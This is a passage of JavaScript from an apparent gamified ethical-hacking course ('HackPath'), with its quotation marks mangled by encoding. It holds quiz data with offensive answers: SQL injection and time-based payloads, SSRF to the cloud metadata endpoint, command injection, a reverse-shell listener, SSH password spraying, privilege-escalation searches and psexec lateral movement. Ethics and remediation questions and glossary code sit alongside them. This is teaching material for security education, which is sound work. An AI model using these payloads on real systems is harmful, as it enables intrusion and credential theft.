{type:â€œtypeâ€,q:â€œRun vulnerability scripts against a target:â€,a:[â€œnmap â€“script vuln targetâ€,â€œnmap â€“script=vuln 10.10.10.5â€],why:â€œNSE vulnerability scripts automate checking for known CVEs.â€},
{type:â€œbuildâ€,q:â€œBuild a stealthy scan with decoys:â€,parts:[â€œnmapâ€,â€-sSâ€,â€-fâ€,â€-Dâ€,â€œRND:5â€,â€œtargetâ€],answer:[â€œnmapâ€,â€-sSâ€,â€-fâ€,â€-Dâ€,â€œRND:5â€,â€œtargetâ€],why:â€œSYN scan + fragmentation + random decoy IPs for evasion.â€}
]},
{id:â€œm2t2â€,title:â€\uD83E\uDD47 Network Test 2â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œSave scan results in all formats:â€,a:[â€œnmap -oA results targetâ€,â€œnmap -oA scan targetâ€],why:â€-oA creates .nmap, .xml, and .gnmap simultaneously.â€},
{type:â€œpickâ€,q:â€œPrivate IP range 10.0.0.0/8 is:â€,opts:[â€œInternal network only, not routable on the internetâ€,â€œA public IP rangeâ€,â€œReserved for DNSâ€,â€œUsed only for VPNsâ€],a:â€œInternal network only, not routable on the internetâ€,why:â€œ10.x.x.x, 172.16-31.x.x, and 192.168.x.x are private/internal ranges.â€},
{type:â€œpickâ€,q:â€œWhat does -f do in nmap?â€,opts:[â€œFragments packets to evade firewallsâ€,â€œForces scan completionâ€,â€œFilters resultsâ€,â€œFinds hidden portsâ€],a:â€œFragments packets to evade firewallsâ€,why:â€œFragmentation splits packets so IDS canâ€™t easily reassemble and inspect them.â€},
{type:â€œtypeâ€,q:â€œCheck your machineâ€™s IP address:â€,a:[â€œip addrâ€,â€œifconfigâ€,â€œip aâ€,â€œhostname -Iâ€],why:â€œKnow your own IP for setting up listeners and tunnels.â€},
{type:â€œmatchâ€,q:â€œMatch the port to its service:â€,pairs:[[â€œ22â€,â€œSSHâ€],[â€œ80â€,â€œHTTPâ€],[â€œ443â€,â€œHTTPSâ€],[â€œ3306â€,â€œMySQLâ€]],why:â€œKnowing port-service mappings is fundamental to pentesting.â€},
{type:â€œpickâ€,q:â€œUDP scanning is slower because:â€,opts:[â€œNo acknowledgment \u2014 must wait for timeout on each portâ€,â€œUDP packets are largerâ€,â€œUDP uses encryptionâ€,â€œUDP is more complexâ€],a:â€œNo acknowledgment \u2014 must wait for timeout on each portâ€,why:â€œTCP sends RST for closed ports. UDP gives no response, so nmap must wait and infer.â€}
]},
{id:â€œm2t3â€,title:â€\uD83E\uDD47 Network Test 3â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œEnumerate subdomains and check which are live:â€,a:[â€œsubfinder -d target.com | httpxâ€,â€œsubfinder -d target.com -silent | httpxâ€],why:â€œChain subdomain discovery with live host verification.â€},
{type:â€œtypeâ€,q:â€œCheck DNS records:â€,a:[â€œdig target.com ANYâ€,â€œdig target.comâ€,â€œnslookup target.comâ€],why:â€œDNS reveals mail servers, nameservers, and IP addresses.â€},
{type:â€œpickâ€,q:â€œSSL certificate transparency logs reveal:â€,opts:[â€œAll subdomains a certificate was issued forâ€,â€œServer passwordsâ€,â€œDatabase contentsâ€,â€œAdmin panel locationsâ€],a:â€œAll subdomains a certificate was issued forâ€,why:â€œcrt.sh shows every subdomain in SSL certificates. Free OSINT goldmine.â€},
{type:â€œtypeâ€,q:â€œBuild a custom wordlist from a target site:â€,a:[â€œcewl http://target.com -w custom.txtâ€,â€œcewl http://target.com -d 2 -w custom.txtâ€],why:â€œCustom wordlists find target-specific paths that generic lists miss.â€},
{type:â€œtypeâ€,q:â€œFingerprint a websiteâ€™s technology:â€,a:[â€œwhatweb http://target.comâ€,â€œwhatweb target.comâ€],why:â€œReveals CMS, framework versions, server software for CVE matching.â€},
{type:â€œpickâ€,q:â€œWHOIS lookup reveals:â€,opts:[â€œDomain owner, registrar, and nameserversâ€,â€œThe serverâ€™s open portsâ€,â€œDatabase schemasâ€,â€œEmployee passwordsâ€],a:â€œDomain owner, registrar, and nameserversâ€,why:â€œWHOIS shows registration info including contact details and DNS servers.â€}
]}
]}
]};

var SEC14 = {
id:â€œs14â€,title:â€œMasters: Web Attacksâ€,tier:â€œmastersâ€,icon:â€\uD83C\uDFC6â€,color:â€œvar(â€“gold)â€,
units:[
{id:â€œm3â€,title:â€œWeb Attack Masteryâ€,desc:â€œSQLi, XSS, SSRF, auth bypassâ€,levels:[
{id:â€œm3t1â€,title:â€\uD83E\uDD47 Web Attack Test 1â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œTest for SQL injection on a login form:â€,a:[â€â€™ OR 1=1â€“â€,â€œadminâ€™ OR 1=1â€“â€,â€â€™ OR â€˜1â€™=â€˜1â€],why:â€œIf the login bypasses, the form is vulnerable to SQLi.â€},
{type:â€œpickâ€,q:â€œBlind SQLi is confirmed when:â€,opts:[â€œPage behavior changes with true/false conditionsâ€,â€œYou see SQL error messagesâ€,â€œThe page crashesâ€,â€œData appears in the responseâ€],a:â€œPage behavior changes with true/false conditionsâ€,why:â€œBoolean blind: 1=1 gives one response, 1=2 gives another. Proves injection.â€},
{type:â€œtypeâ€,q:â€œTest for time-based blind SQLi:â€,a:[â€â€™ AND SLEEP(5)â€“â€,â€â€™ OR SLEEP(5)â€“â€],why:â€œIf the response delays by 5 seconds, the database executed your payload.â€},
{type:â€œtypeâ€,q:â€œList all database tables via UNION injection:â€,a:[â€â€™ UNION SELECT table_name FROM information_schema.tablesâ€“â€,â€â€™ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tablesâ€“â€],why:â€œinformation_schema maps the entire database structure.â€},
{type:â€œpickâ€,q:â€œSEL/**/ECT bypasses WAFs because:â€,opts:[â€œSQL ignores inline commentsâ€,â€œItâ€™s a different commandâ€,â€œComments encrypt the queryâ€,â€œThe WAF canâ€™t read commentsâ€],a:â€œSQL ignores inline commentsâ€,why:â€/**/ is a SQL comment. Database reads SEL+ECT = SELECT. WAF sees gibberish.â€},
{type:â€œpickâ€,q:â€œThe root fix for SQL injection is:â€,opts:[â€œParameterized queriesâ€,â€œInput length limitsâ€,â€œA WAFâ€,â€œHTTPSâ€],a:â€œParameterized queriesâ€,why:â€œPrepared statements separate SQL code from user data. Injection becomes impossible.â€}
]},
{id:â€œm3t2â€,title:â€\uD83E\uDD47 Web Attack Test 2â€,isMasters:true,rounds:[
{type:â€œpickâ€,q:â€œReflected XSS vs Stored XSS:â€,opts:[â€œReflected is in the URL, Stored is saved in the databaseâ€,â€œTheyâ€™re the same thingâ€,â€œReflected is more dangerousâ€,â€œStored only affects the attackerâ€],a:â€œReflected is in the URL, Stored is saved in the databaseâ€,why:â€œStored XSS hits every user who views the page. Reflected needs a crafted link.â€},
{type:â€œpickâ€,q:â€œSSRF to cloud metadata gives you:â€,opts:[â€œTemporary cloud credentials (AWS keys, etc.)â€,â€œThe serverâ€™s source codeâ€,â€œUser passwordsâ€,â€œSSH keysâ€],a:â€œTemporary cloud credentials (AWS keys, etc.)â€,why:â€œ169.254.169.254 returns IAM credentials for the serverâ€™s cloud role.â€},
{type:â€œtypeâ€,q:â€œAccess AWS metadata via SSRF:â€,a:[â€œhttp://169.254.169.254/latest/meta-data/â€,â€œcurl http://169.254.169.254/latest/meta-data/â€],why:â€œStandard cloud metadata endpoint. Returns IAM credentials.â€},
{type:â€œpickâ€,q:â€œCommand injection: user input goes directly into a shell command. How to test?â€,opts:[â€œAppend ; id or | whoami to the inputâ€,â€œTry SQL injectionâ€,â€œSend an XSS payloadâ€,â€œUpload a PHP fileâ€],a:â€œAppend ; id or | whoami to the inputâ€,why:â€œSemicolons and pipes chain commands. ; id runs â€˜idâ€™ after the original command.â€},
{type:â€œpickâ€,q:â€œJWT with algorithm â€˜noneâ€™ means:â€,opts:[â€œAnyone can forge the tokenâ€,â€œExtra security is appliedâ€,â€œThe token expires fasterâ€,â€œEncryption is enabledâ€],a:â€œAnyone can forge the tokenâ€,why:â€œNo signature verification. Attacker can change payload freely.â€},
{type:â€œscenarioâ€,situation:â€œYou found XSS in support tickets that admins review, plus session cookies lack HttpOnly.â€,q:â€œAttack chain?â€,opts:[â€œXSS steals admin cookie \u2192 admin account takeoverâ€,â€œReport XSS, itâ€™s just mediumâ€,â€œUse the XSS for defacementâ€,â€œChain with SQLi insteadâ€],a:â€œXSS steals admin cookie \u2192 admin account takeoverâ€,why:â€œStored XSS + no HttpOnly + admin views = automatic session theft. Critical chain.â€}
]},
{id:â€œm3t3â€,title:â€\uD83E\uDD47 Web Attack Test 3â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œScan for hidden directories:â€,a:[â€œgobuster dir -u http://target.com -w common.txtâ€,â€œdirsearch -u http://target.comâ€,â€œffuf -u http://target.com/FUZZ -w common.txtâ€],why:â€œDirectory brute-forcing finds admin panels, backups, and config files.â€},
{type:â€œpickâ€,q:â€œAn exposed .env file typically contains:â€,opts:[â€œDatabase credentials and API keysâ€,â€œCSS stylesheetsâ€,â€œLog filesâ€,â€œUser profilesâ€],a:â€œDatabase credentials and API keysâ€,why:â€.env stores secrets. Exposed .env = immediate credential compromise.â€},
{type:â€œtypeâ€,q:â€œBrute-force virtual hosts:â€,a:[â€œffuf -u http://target -H â€˜Host: FUZZ.target.comâ€™ -w wordlist.txtâ€,â€œgobuster vhost -u http://target -w wordlist.txtâ€],why:â€œFuzzing the Host header finds hidden subdomains/virtual hosts.â€},
{type:â€œpickâ€,q:â€œOut-of-band (OOB) exfiltration uses:â€,opts:[â€œSide channels like DNSâ€,â€œDirect page outputâ€,â€œError messagesâ€,â€œTime delaysâ€],a:â€œSide channels like DNSâ€,why:â€œWhen thereâ€™s no visible output, OOB sends data through DNS queries to your domain.â€},
{type:â€œpickâ€,q:â€œThe root fix for SSRF is:â€,opts:[â€œURL allowlistingâ€,â€œAdding CAPTCHAâ€,â€œEncrypting URLsâ€,â€œRate limitingâ€],a:â€œURL allowlistingâ€,why:â€œOnly permit requests to approved domains. Block all internal/private IPs.â€},
{type:â€œmatchâ€,q:â€œMatch the vulnerability to its fix:â€,pairs:[[â€œSQLiâ€,â€œParameterized queriesâ€],[â€œXSSâ€,â€œOutput encodingâ€],[â€œSSRFâ€,â€œURL allowlistingâ€],[â€œCommand Injectionâ€,â€œInput validation + no shellâ€]],why:â€œEach vulnerability class has a specific root-cause fix.â€}
]}
]}
]};

var SEC15 = {
id:â€œs15â€,title:â€œMasters: Exploitation & PrivEscâ€,tier:â€œmastersâ€,icon:â€\uD83C\uDFC6â€,color:â€œvar(â€“gold)â€,
units:[
{id:â€œm4â€,title:â€œExploitation Masteryâ€,desc:â€œShells, escalation, pivoting, persistenceâ€,levels:[
{id:â€œm4t1â€,title:â€\uD83E\uDD47 Exploit Test 1â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œStart a netcat listener for a reverse shell:â€,a:[â€œnc -lvnp 4444â€,â€œnc -lvp 4444â€,â€œncat -lvnp 4444â€],why:â€œListener catches incoming reverse shell connections.â€},
{type:â€œpickâ€,q:â€œA reverse shell connects:â€,opts:[â€œFrom the target back to your machineâ€,â€œFrom your machine to the targetâ€,â€œBetween two targetsâ€,â€œThrough a web browserâ€],a:â€œFrom the target back to your machineâ€,why:â€œTarget initiates the connection outbound to your listener. Bypasses firewalls.â€},
{type:â€œtypeâ€,q:â€œCrack an MD5 hash with hashcat:â€,a:[â€œhashcat -m 0 hash.txt rockyou.txtâ€,â€œhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txtâ€],why:â€-m 0 = MD5. rockyou.txt has 14 million leaked passwords.â€},
{type:â€œtypeâ€,q:â€œPassword spray SSH with one password across many users:â€,a:[â€œhydra -L users.txt -p Welcome1 ssh://targetâ€,â€œhydra -L users.txt -p â€˜Welcome1â€™ ssh://targetâ€],why:â€-L = user list, -p = single password. Avoids account lockout.â€},
{type:â€œpickâ€,q:â€œbcrypt hashes are hard to crack because:â€,opts:[â€œTheyâ€™re intentionally slow to computeâ€,â€œThey use longer keysâ€,â€œTheyâ€™re encrypted twiceâ€,â€œThey change every timeâ€],a:â€œTheyâ€™re intentionally slow to computeâ€,why:â€œbcrypt uses key stretching. Each guess takes milliseconds vs nanoseconds for MD5.â€},
{type:â€œpickâ€,q:â€œStealing a session cookie gives you:â€,opts:[â€œInstant login as that userâ€,â€œTheir plaintext passwordâ€,â€œAccess to their emailâ€,â€œTheir MFA codesâ€],a:â€œInstant login as that userâ€,why:â€œSession cookies ARE the authentication. No password needed.â€}
]},
{id:â€œm4t2â€,title:â€\uD83E\uDD47 Exploit Test 2â€,isMasters:true,rounds:[
{type:â€œtypeâ€,q:â€œFind SUID binaries for privilege escalation:â€,a:[â€œfind / -perm -4000 2>/dev/nullâ€,â€œfind / -perm -u=s 2>/dev/nullâ€],why:â€œSUID files run as owner (root). Exploitable ones = instant root.â€},
{type:â€œtypeâ€,q:â€œCheck for writable cron jobs:â€,a:[â€œcat /etc/crontabâ€,â€œls -la /etc/cron.d/â€,â€œcrontab -lâ€],why:â€œWritable scripts in root cron = root code execution.â€},
{type:â€œpickâ€,q:â€œA Docker container with â€“privileged can:â€,opts:[â€œEscape to the host systemâ€,â€œOnly access its own filesystemâ€,â€œRun fasterâ€,â€œAuto-updateâ€],a:â€œEscape to the host systemâ€,why:â€â€“privileged gives full host device access. Mount host disk = escape.â€},
{type:â€œscenarioâ€,situation:â€œYou found: SUID python3, writable cron script, and an old kernel. Which is safest to exploit?â€,q:â€œBest escalation path?â€,opts:[â€œSUID python3 \u2014 reliable and instantâ€,â€œKernel exploit \u2014 might crash the systemâ€,â€œWritable cron \u2014 have to wait for it to runâ€,â€œAll three at onceâ€],a:â€œSUID python3 \u2014 reliable and instantâ€,why:â€œSUID exploitation is instant, reliable, and wonâ€™t crash anything. Kernel exploits are risky.â€},
{type:â€œtypeâ€,q:â€œUse Metasploitâ€™s search to find an exploit:â€,a:[â€œsearch eternalblueâ€,â€œsearch type:exploit wordpressâ€,â€œsearch cve:2024â€],why:â€œMetasploitâ€™s search finds modules by name, CVE, or type.â€},
{type:â€œpickâ€,q:â€œMeterpreterâ€™s getsystem attempts to:â€,opts:[â€œEscalate to SYSTEM/root privilegesâ€,â€œDownload system filesâ€,â€œGet system informationâ€,â€œConnect to another systemâ€],a:â€œEscalate to SYSTEM/root privilegesâ€,why:â€œgetsystem tries multiple techniques to escalate from user to SYSTEM.â€}
]},
{id:â€œm4t3â€,title:â€\uD83E\uDD47 Exploit Test 3â€,isMasters:true,rounds:[
{type:â€œbuildâ€,q:â€œBuild an SSH tunnel to reach an internal web server:â€,parts:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],answer:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],why:â€œLocal port forward through a compromised pivot host.â€},
{type:â€œpickâ€,q:â€œAfter compromising a server, first priority:â€,opts:[â€œEnumerate users, SUID, creds, networkâ€,â€œDelete logsâ€,â€œKernel exploit immediatelyâ€,â€œScan the whole internetâ€],a:â€œEnumerate users, SUID, creds, networkâ€,why:â€œMethodical enumeration finds the safest escalation path.â€},
{type:â€œtypeâ€,q:â€œSearch config files for hardcoded passwords:â€,a:[â€œgrep -ri â€˜passwordâ€™ /etc/ /var/www/ /opt/â€,â€œgrep -ri â€˜passâ€™ /etc/ /var/www/â€],why:â€œConfig files are the #1 source of credentials on compromised boxes.â€},
{type:â€œtypeâ€,q:â€œCheck bash history for leaked secrets:â€,a:[â€œcat ~/.bash_historyâ€,â€œcat /home/*/.bash_historyâ€],why:â€œUsers type passwords in commands: mysql -pPassword, curl with API keys.â€},
{type:â€œpickâ€,q:â€œLateral movement via SSH key reuse works because:â€,opts:[â€œSame SSH key often unlocks multiple serversâ€,â€œSSH keys are easy to crackâ€,â€œSSH has known vulnerabilitiesâ€,â€œKeys expire quicklyâ€],a:â€œSame SSH key often unlocks multiple serversâ€,why:â€œAdmins reuse keys. Found key + known_hosts = access to more machines.â€},
{type:â€œscenarioâ€,situation:â€œYou have root on a DMZ server and found domain admin credentials in a config file. Internal DC is at 10.0.0.5.â€,q:â€œFinal step?â€,opts:[â€œpsexec/wmiexec to the domain controllerâ€,â€œScan every internal host firstâ€,â€œSet up a persistent backdoorâ€,â€œEmail the admin their passwordâ€],a:â€œpsexec/wmiexec to the domain controllerâ€,why:â€œDA creds + psexec = shell on the DC. Complete network compromise.â€}
]}
]}
]};

var SEC16 = {
id:â€œs16â€,title:â€œMasters: Methodology & Ethicsâ€,tier:â€œmastersâ€,icon:â€\uD83C\uDFC6â€,color:â€œvar(â€“gold)â€,
units:[
{id:â€œm5â€,title:â€œFinal Certificationâ€,desc:â€œEthics, methodology, and real-world readinessâ€,levels:[
{id:â€œm5t1â€,title:â€\uD83E\uDD47 Methodology Test 1â€,isMasters:true,rounds:[
{type:â€œorderâ€,q:â€œOrder the 5 phases of ethical hacking:â€,items:[â€œReconnaissanceâ€,â€œScanning & Enumerationâ€,â€œExploitationâ€,â€œPost-Exploitationâ€,â€œReportingâ€],why:â€œEvery engagement follows this methodology. Skipping phases leads to missed findings.â€},
{type:â€œpickâ€,q:â€œYou find a critical vulnerability. What do you do FIRST?â€,opts:[â€œDocument it and verify in scopeâ€,â€œExploit it fully to show impactâ€,â€œTell your friend about itâ€,â€œPost it on social mediaâ€],a:â€œDocument it and verify in scopeâ€,why:â€œAlways verify the target is in scope. Exploiting out-of-scope targets is illegal.â€},
{type:â€œpickâ€,q:â€œPenetration testing without written authorization is:â€,opts:[â€œAlways illegalâ€,â€œLegal if you find bugsâ€,â€œLegal on weekendsâ€,â€œLegal if the target is a big companyâ€],a:â€œAlways illegalâ€,why:â€œWritten permission (scope document) is required. Without it, itâ€™s a crime.â€},
{type:â€œpickâ€,q:â€œA white hat hacker is:â€,opts:[â€œAn authorized security testerâ€,â€œA criminal hackerâ€,â€œSomeone who uses tools without understandingâ€,â€œAn anonymous activistâ€],a:â€œAn authorized security testerâ€,why:â€œWhite hats have written permission and work within legal boundaries.â€},
{type:â€œscenarioâ€,situation:â€œDuring a pentest you accidentally access a database with real customer credit card numbers.â€,q:â€œCorrect action?â€,opts:[â€œStop, document the access path, report to client immediatelyâ€,â€œDownload the data as proofâ€,â€œTell the customers their data is exposedâ€,â€œKeep testing other systemsâ€],a:â€œStop, document the access path, report to client immediatelyâ€,why:â€œSensitive data access must be reported immediately. Never download or view more than needed.â€},
{type:â€œpickâ€,q:â€œCVSS score for unauthenticated RCE on a public server:â€,opts:[â€œCritical (9.0+)â€,â€œHigh (7.0-8.9)â€,â€œMedium (4.0-6.9)â€,â€œLow (0.1-3.9)â€],a:â€œCritical (9.0+)â€,why:â€œUnauthenticated Remote Code Execution on a public server is always critical.â€}
]},
{id:â€œm5t2â€,title:â€\uD83E\uDD47 Methodology Test 2â€,isMasters:true,rounds:[
{type:â€œorderâ€,q:â€œOrder a vulnerability report:â€,items:[â€œTitle & Severityâ€,â€œDescriptionâ€,â€œSteps to reproduceâ€,â€œEvidence & proofâ€,â€œImpact statementâ€,â€œRemediationâ€],why:â€œStructured reports communicate findings clearly and get bugs fixed.â€},
{type:â€œmatchâ€,q:â€œMatch the vulnerability to its severity:â€,pairs:[[â€œUnauthenticated RCEâ€,â€œCriticalâ€],[â€œReflected XSSâ€,â€œMediumâ€],[â€œMissing HTTP headerâ€,â€œLowâ€],[â€œSQLi with data accessâ€,â€œHighâ€]],why:â€œSeverity depends on exploitability and impact.â€},
{type:â€œpickâ€,q:â€œA 4-digit MFA code without rate limiting has:â€,opts:[â€œ10,000 possible combinations, trivially brute-forceableâ€,â€œInfinite combinationsâ€,â€œOnly 100 combinationsâ€,â€œ1 million combinationsâ€],a:â€œ10,000 possible combinations, trivially brute-forceableâ€,why:â€œ0000-9999 = 10,000 combos. Without rate limiting, takes minutes.â€},
{type:â€œpickâ€,q:â€œCredential stuffing uses:â€,opts:[â€œLeaked username:password pairs from breachesâ€,â€œRandom password guessesâ€,â€œOnly one password per accountâ€,â€œSocial engineeringâ€],a:â€œLeaked username:password pairs from breachesâ€,why:â€œPeople reuse passwords. Breached combo lists are tested on other services.â€},
{type:â€œpickâ€,q:â€œAfter a pentest, who should receive the report?â€,opts:[â€œThe clientâ€™s designated security contactâ€,â€œEveryone at the companyâ€,â€œThe publicâ€,â€œYour social media followersâ€],a:â€œThe clientâ€™s designated security contactâ€,why:â€œReports contain sensitive exploit details. Only the authorized contact should receive them.â€},
{type:â€œpickâ€,q:â€œBug bounty scope says *.target.com EXCEPT mail.target.com. You find a vuln on mail.target.com. You should:â€,opts:[â€œDo NOT test further, itâ€™s out of scopeâ€,â€œExploit it anyway since itâ€™s a subdomainâ€,â€œReport it with full detailsâ€,â€œTell other researchers about itâ€],a:â€œDo NOT test further, itâ€™s out of scopeâ€,why:â€œOut of scope means do not touch. Testing it could be illegal.â€}
]},
{id:â€œm5t3â€,title:â€\uD83C\uDFC6 Final Certificationâ€,isMasters:true,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œThe most important tool in ethical hacking is:â€,opts:[â€œMethodology and critical thinkingâ€,â€œMetasploitâ€,â€œKali Linuxâ€,â€œA fast computerâ€],a:â€œMethodology and critical thinkingâ€,why:â€œTools change. Thinking methodically, understanding systems, and being ethical never goes out of style.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™ve completed the full HackPath curriculum. A friend asks you to â€˜hack their exâ€™s Instagram.â€™â€,q:â€œYour response?â€,opts:[â€œRefuse \u2014 thatâ€™s unauthorized access, itâ€™s illegalâ€,â€œDo it as a favorâ€,â€œDo it but charge moneyâ€,â€œShow them how but donâ€™t do it yourselfâ€],a:â€œRefuse \u2014 thatâ€™s unauthorized access, itâ€™s illegalâ€,why:â€œHacking without authorization is a crime regardless of the reason. Ethics first.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™re offered $5000 to find vulnerabilities in a company. They give you a signed contract with clear scope.â€,q:â€œIs this ethical?â€,opts:[â€œYes \u2014 authorized pentest with written scopeâ€,â€œNo \u2014 all hacking is illegalâ€,â€œOnly if you work for a security companyâ€,â€œOnly if you use approved toolsâ€],a:â€œYes \u2014 authorized pentest with written scopeâ€,why:â€œWritten authorization + clear scope = legal and ethical penetration testing.â€},
{type:â€œorderâ€,q:â€œFinal order \u2014 the complete attack chain:â€,items:[â€œOSINT & passive reconâ€,â€œActive scanning & enumerationâ€,â€œInitial exploitationâ€,â€œPrivilege escalationâ€,â€œLateral movement & pivotingâ€,â€œData exfiltration & reportingâ€],why:â€œThis is the full methodology from first recon to final report. Youâ€™ve mastered it all.â€},
{type:â€œpickâ€,q:â€œWhat separates a pentester from a criminal?â€,opts:[â€œWritten authorization and ethical boundariesâ€,â€œTechnical skill levelâ€,â€œThe tools they useâ€,â€œHow fast they hackâ€],a:â€œWritten authorization and ethical boundariesâ€,why:â€œPermission and ethics. Same skills, completely different intent and legality.â€},
{type:â€œpickâ€,q:â€œYouâ€™ve completed HackPath. Whatâ€™s next?â€,opts:[â€œPractice on legal platforms (HackTheBox, TryHackMe) and pursue certificationsâ€,â€œStart hacking random websitesâ€,â€œSell exploits on the dark webâ€,â€œNothing, youâ€™re done learningâ€],a:â€œPractice on legal platforms (HackTheBox, TryHackMe) and pursue certificationsâ€,why:â€œReal skill comes from practice. HTB, THM, OSCP, and bug bounties are your next steps.â€}
]}
]}
]};

var SECTIONS = [SEC1, SEC2, SEC3, SEC4, SEC5, SEC6, SEC7, SEC8, SEC9, SEC10, SEC11, SEC12, SEC13, SEC14, SEC15, SEC16];
var ALL_UNITS = [];
var ALL_LEVELS = [];
var PATH = [];

SECTIONS.forEach(function(sec){
sec.units.forEach(function(unit){
unit.sectionId = sec.id;
unit.sectionTitle = sec.title;
unit.tier = sec.tier;
ALL_UNITS.push(unit);
unit.levels.forEach(function(lev){
lev.unitId = unit.id;
lev.unitTitle = unit.title;
lev.sectionId = sec.id;
lev.tier = sec.tier;
ALL_LEVELS.push(lev);
PATH.push(lev.id);
});
});
});

// === MODAL ===
function showConfirm(title,msg,onYes){
var overlay=document.createElement(â€˜divâ€™);
overlay.style.cssText=â€˜position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px;animation:fadeIn .2s easeâ€™;
var box=document.createElement(â€˜divâ€™);box.className=â€˜card popInâ€™;
box.style.cssText=â€˜max-width:340px;width:100%;text-align:center;display:flex;flex-direction:column;gap:14pxâ€™;
box.innerHTML=â€™<div style="font-size:1.05rem;font-weight:700">â€™+title+â€™</div><div style="font-size:.85rem;color:var(--text2)">â€™+msg+â€™</div>â€™;
var btns=document.createElement(â€˜divâ€™);btns.style.cssText=â€˜display:flex;gap:8pxâ€™;
var no=document.createElement(â€˜buttonâ€™);no.className=â€˜btn secâ€™;no.style.flex=â€˜1â€™;no.textContent=â€˜Cancelâ€™;
no.onclick=function(){overlay.remove()};
var yes=document.createElement(â€˜buttonâ€™);yes.className=â€˜btnâ€™;yes.style.cssText=â€˜flex:1;background:var(â€“red);color:whiteâ€™;
yes.textContent=â€˜Confirmâ€™;yes.onclick=function(){overlay.remove();if(onYes)onYes()};
btns.appendChild(no);btns.appendChild(yes);box.appendChild(btns);
overlay.appendChild(box);document.body.appendChild(overlay);
overlay.onclick=function(e){if(e.target===overlay)overlay.remove()};
}

// === GLOSSARY ===
var GLOSS={
â€œportâ€:â€œA numbered door on a computer (0-65535). Each service uses a specific port \u2014 like apartment numbers in a building.â€,
â€œip addressâ€:â€œA computerâ€™s address on a network, like a street address. Example: 192.168.1.1â€,
â€œipâ€:â€œA computerâ€™s address on a network, like a street address. Example: 192.168.1.1â€,
â€œhashâ€:â€œA one-way scramble of a password. You canâ€™t reverse it, but you can compare it to known hashes.â€,
â€œsuidâ€:â€œA special permission on Linux files that makes them run as the fileâ€™s owner (usually root) instead of you.â€,
â€œrootâ€:â€œThe all-powerful admin account on Linux. Getting root = having complete control.â€,
â€œshellâ€:â€œA text-based interface to control a computer. Think of it as a conversation with the machine.â€,
â€œreverse shellâ€:â€œA connection where the TARGET computer calls back to YOUR computer, giving you remote control.â€,
â€œpayloadâ€:â€œThe code you deliver after exploiting a vulnerability \u2014 like the spy you sneak in after kicking the door down.â€,
â€œexploitâ€:â€œA piece of code that takes advantage of a vulnerability to do something unintended.â€,
â€œvulnerabilityâ€:â€œA weakness or flaw in software that can be exploited.â€,
â€œnmapâ€:â€œThe #1 network scanning tool. Finds open ports, services, and operating systems.â€,
â€œsql injectionâ€:â€œTricking a database by putting commands into input fields like login forms.â€,
â€œxssâ€:â€œCross-Site Scripting \u2014 injecting code into a website that runs in other usersâ€™ browsers.â€,
â€œbrute forceâ€:â€œTrying every possible password until one works.â€,
â€œdnsâ€:â€œDomain Name System \u2014 translates domain names (google.com) into IP addresses.â€,
â€œtcpâ€:â€œA reliable network protocol that guarantees data arrives in order (like a phone call).â€,
â€œudpâ€:â€œA fast but unreliable protocol with no delivery guarantee (like shouting across a room).â€,
â€œsshâ€:â€œSecure Shell \u2014 encrypted remote access to another computerâ€™s terminal. Port 22.â€,
â€œhttpâ€:â€œThe protocol browsers use to load websites. Port 80 (or 443 for HTTPS).â€,
â€œsubnetâ€:â€œA subdivision of a network. /24 = 256 addresses, /25 = 128, etc.â€,
â€œprivilege escalationâ€:â€œGoing from a regular user to root/admin \u2014 like promoting yourself from janitor to king.â€,
â€œprivescâ€:â€œGoing from a regular user to root/admin \u2014 like promoting yourself from janitor to king.â€,
â€œosintâ€:â€œOpen Source Intelligence \u2014 gathering info from public sources like Google and social media.â€,
â€œburp suiteâ€:â€œA tool that intercepts and modifies web traffic between your browser and a website.â€,
â€œmetasploitâ€:â€œA framework (weapon vault) containing thousands of exploits and payloads.â€,
â€œmeterpreterâ€:â€œMetasploitâ€™s advanced payload \u2014 gives you file access, screenshots, keylogging, and more on a hacked machine.â€,
â€œctfâ€:â€œCapture The Flag \u2014 hacking competitions where you solve challenges to find hidden flags.â€,
â€œcveâ€:â€œCommon Vulnerabilities and Exposures \u2014 a database of known security flaws, each with a unique ID.â€,
â€œwordlistâ€:â€œA file containing thousands/millions of words to try when cracking passwords.â€,
â€œenumerationâ€:â€œSystematically gathering information about a target \u2014 users, services, shares, etc.â€,
â€œpivotingâ€:â€œUsing a hacked machine as a stepping stone to reach other machines on internal networks.â€,
â€œscopeâ€:â€œThe agreed-upon list of what youâ€™re allowed to test. Going outside scope = illegal.â€,
â€œndaâ€:â€œNon-Disclosure Agreement \u2014 a contract saying youâ€™ll keep all findings secret.â€,
â€œfirewallâ€:â€œA security system that monitors and controls network traffic based on rules.â€,
â€œidsâ€:â€œIntrusion Detection System \u2014 watches network traffic for suspicious activity.â€,
â€œapiâ€:â€œApplication Programming Interface \u2014 how software communicates with other software.â€,
â€œjwtâ€:â€œJSON Web Token \u2014 a compact token used for authentication, made of header.payload.signature.â€,
â€œssrfâ€:â€œServer-Side Request Forgery \u2014 tricking a server into making requests to internal resources.â€
};
function getGlossaryTerms(text){
var found=[],low=text.toLowerCase();
var keys=Object.keys(GLOSS).sort(function(a,b){return b.length-a.length});
for(var i=0;i<keys.length;i++){
var k=keys[i];
if(low.indexOf(k)!==-1 && found.length<3){
var dup=false;for(var j=0;j<found.length;j++)if(found[j].term===k)dup=true;
if(!dup)found.push({term:k,def:GLOSS[k]});
}
}
return found;
}
function makeGlossaryEl(terms){
if(!terms.length)return null;
var d=document.createElement(â€˜divâ€™);d.style.cssText=â€˜margin-top:8pxâ€™;
terms.forEach(function(t){
var row=document.createElement(â€˜divâ€™);row.style.cssText=â€˜font-size:.75rem;color:var(â€“textDim);padding:6px 10px;background:var(â€“bg2);border-radius:6px;margin-top:4px;line-height:1.4â€™;
